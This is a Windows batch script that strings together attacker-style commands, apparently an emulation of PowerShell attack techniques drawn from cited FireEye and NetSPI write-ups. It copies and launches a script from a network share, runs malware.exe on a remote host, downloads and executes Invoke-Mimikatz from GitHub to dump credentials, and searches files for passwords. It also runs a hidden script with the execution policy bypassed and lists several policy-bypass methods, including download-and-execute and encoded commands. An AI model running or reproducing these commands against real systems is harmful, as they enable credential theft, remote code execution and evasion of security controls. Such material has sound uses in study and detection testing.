@echo on

; https://technet.microsoft.com/en-ca/library/dn535776.aspx
mkdir c:\systemfiles\temp\commandandcontrol\zone\fifthward
copy \\192.168.1.254\c$\hidden c:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward
start C:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward\ntuserrights.vbs
del c:\systemfiles\temp\*.* /Q

powershell -Command "Get-ExecutionPolicy"

; https://www.fireeye.com/content/dam/fireeye-www/global/en/solutions/pdfs/wp-lazanciyan-investigating-powershell-attacks.pdf
powershell -Command "Invoke-Command 192.168.17.150 {Get-ChildItem c:\}"
powershell -Command "Invoke-Command 192.168.17.150 {c:\malware.exe}"
powershell -Command "Invoke-Command 192.168.17.150 {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}"
powershell -Command "Enter-PSSession 192.168.17.150"
powershell -Command "Get-ChildItem c:\temp -Filter *.txt -Recurse | Select-String password"
powershell.exe -NonInteractive -WindowStyle Hidden -Execution -Policy bypass -File "C:\windows\system32\evil.ps1"

; https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/

echo Write-Host "My voice is my passport, verify me." > runme.ps1
powershell -File runme.ps1
type runme.ps1 | PowerShell.exe -noprofile -
powershell -Command "Get-Content .\runme.ps1 | PowerShell.exe -noprofile - "
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/runme.ps1')"
powershell -Command "$command = \"Write-Host 'My voice is my passport, verify me.'\" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand"
powershell -Command "invoke-command -scriptblock {Write-Host \"My voice is my passport, verify me.\"}"
powershell -Command "Get-Content .\runme.ps1 | Invoke-Expression"
PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1


